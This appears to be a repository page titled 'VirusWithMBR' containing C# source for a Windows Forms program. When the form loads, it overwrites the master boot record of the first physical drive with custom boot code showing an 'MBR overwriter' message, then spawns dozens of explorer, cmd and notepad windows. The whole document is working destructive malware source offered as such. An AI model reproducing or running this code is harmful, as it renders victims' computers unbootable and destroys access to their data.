# VirusWithMBR
VirusWithMBR Code - using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics; // Добавлено пространство имен

namespace WindowsFormsApp6
{
    public partial class Form1 : Form
    {
        private byte[] ipBuffer;
        private uint nNumberOfBytesToWrite;

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        // dwCreationDisposition
        private const uint OpenExisting = 0x3;

        // dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x40000000;

        private const uint MbrSize = 512u;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processinformationLenght);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                byte[] mbrDate = new byte[]
                {
                    0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
                    0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
                    0x10, 0xEB, 0xF5, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x68, 0x65,
                    0x72, 0x65, 0x29, 0x0D, 0x0A, 0x4D, 0x42, 0x52, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x77, 0x72, 0x69,
                    0x74, 0x65, 0x72, 0x20, 0x62, 0x79, 0x20, 0x53, 0x75, 0x70, 0x65, 0x72, 0x20, 0x54, 0x61, 0x6E,
                    0x6B, 0x20, 0x3A, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                };

                IntPtr mbrData = CreateFile(
                    @"\\.\PhysicalDrive0",
                    GenericWrite,
                    FileShareWrite,
                    IntPtr.Zero,
                    OpenExisting,
                    0,
                    IntPtr.Zero);

                WriteFile(mbrData, mbrDate, MbrSize, out uint IpNumberOfBytesWritten, IntPtr.Zero);
                CloseHandle(mbrData);

                // Исправленный вызов Process.Start
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("explorer.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("cmd.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");
                Process.Start("notepad.exe");






            }
            catch
            {
                // Обработка исключений
            }
        }
    }
}
